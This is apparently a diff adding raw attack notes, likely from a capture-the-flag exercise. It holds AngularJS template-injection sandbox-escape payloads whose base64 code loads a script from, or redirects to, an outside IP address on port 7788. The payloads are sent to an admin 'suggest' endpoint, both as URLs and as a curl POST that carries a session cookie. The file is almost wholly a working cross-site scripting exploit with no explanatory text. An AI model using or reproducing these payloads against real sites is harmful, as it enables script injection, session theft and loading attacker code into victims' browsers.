@@ -1,0 +1,13 @@
+{{''.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cy5zcmM9Imh0dHA6Ly8xMTguMTYzLjIwMC41NTo3Nzg4L3YuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7Cg==")) //');}}
+
+{{''.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob("bG9jYXRpb24uaHJlZj0iLy8xMTguMTYzLjIwMC41NTo3Nzg4Lz92LmpzIgo=")) //');}}
+
+
+http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B''.constructor.prototype.charAt=[].join;$eval('x=1%7D%20%7D%20%7D;eval(atob(%22bG9jYXRpb24uaHJlZj0iLy8xMTguMTYzLjIwMC41NTo3Nzg4Lz92LmpzIgo=%22))%20//');%7D%7D")
+
+http://127.0.0.1:1002/admin/suggest?suggest={{''.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob("bG9jYXRpb24uaHJlZj0iLy8xMTguMTYzLjIwMC41NTo3Nzg4Lz92LmpzIgo=")) //');}}
+
+http://127.0.0.1:1002/admin/file
+
+
+curl -vv 'http://116.62.137.114:4879/suggest' -H 'Origin: http://116.62.137.114:4879' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: ssssssionid=s%3AP6OdmgTF0paCJ0_vZmay7U0ypPbASNLV.MU3bCFeRFM4cM%2BjnbpRVlrNsZY5gy5B%2BSlgJntHtzJI' --data 'suggest=%7B%7B%27%27.constructor.prototype.charAt%3D%5B%5D.join%3B%24eval%28%27x%3D1%7D+%7D+%7D%3Beval%28atob%28%22dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cy5zcmM9Imh0dHA6Ly8xMTguMTYzLjIwMC41NTo3Nzg4L3YuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7Cg%3D%3D%22%29%29+%2F%2F%27%29%3B%7D%7D'
